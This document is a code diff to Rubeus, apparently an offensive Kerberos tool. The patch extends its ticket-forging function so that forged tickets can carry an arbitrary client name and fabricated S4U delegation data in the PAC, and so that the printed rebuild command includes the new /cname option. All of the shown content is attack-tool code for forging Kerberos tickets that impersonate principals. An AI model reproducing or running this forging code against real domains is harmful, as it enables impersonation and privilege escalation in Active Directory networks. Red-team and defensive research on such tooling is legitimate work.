@@ -65,7 +65,11 @@ namespace Rubeus
             string outfile = null,
             bool ptt = false,
             // print a command to rebuild the ticket(s)
-            bool printcmd = false
+            bool printcmd = false,
+            // arguments for unusual tickets
+            string cName = null,
+            string s4uProxyTarget = null,
+            string s4uTransitedServices = null
             )
         {
             // vars
@@ -714,6 +718,7 @@ namespace Rubeus
             // loop incase we need to generate multiple tickets as everything below this are effected
             do
             {
+                // Create PacInfoBuffers
                 kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                 LogonInfo li = new LogonInfo(kvi);
 
@@ -722,8 +727,18 @@ namespace Rubeus
 
                 UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
 
+                S4UDelegationInfo s4u = null;
+                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
+                {
+                    s4u = new S4UDelegationInfo(s4uProxyTarget, s4uTransitedServices.Split(','));
+                }
+
                 Console.WriteLine("[*] Generating EncTicketPart");
-                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);
+                if (String.IsNullOrEmpty(cName))
+                {
+                    cName = user;
+                }
+                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), cName, flags, cn.ClientId);
 
                 // set other times in EncTicketPart
                 DateTime? check = null;
@@ -754,6 +769,10 @@ namespace Rubeus
 
                 // add sections to the PAC, get bytes and generate checksums
                 List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
+                if (s4u != null)
+                {
+                    PacInfoBuffers.Add(s4u);
+                }
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
@@ -768,6 +787,10 @@ namespace Rubeus
                 svrSigData.Signature = svrSig;
                 kdcSigData.Signature = kdcSig;
                 PacInfoBuffers = new List<PacInfoBuffer>();
+                if (s4u != null)
+                {
+                    PacInfoBuffers.Add(s4u);
+                }
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
@@ -1016,6 +1039,10 @@ namespace Rubeus
                 if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                 {
                     cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
+                }
+                if (!user.Equals(cName))
+                {
+                    cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
                 }
 
                 // print the command
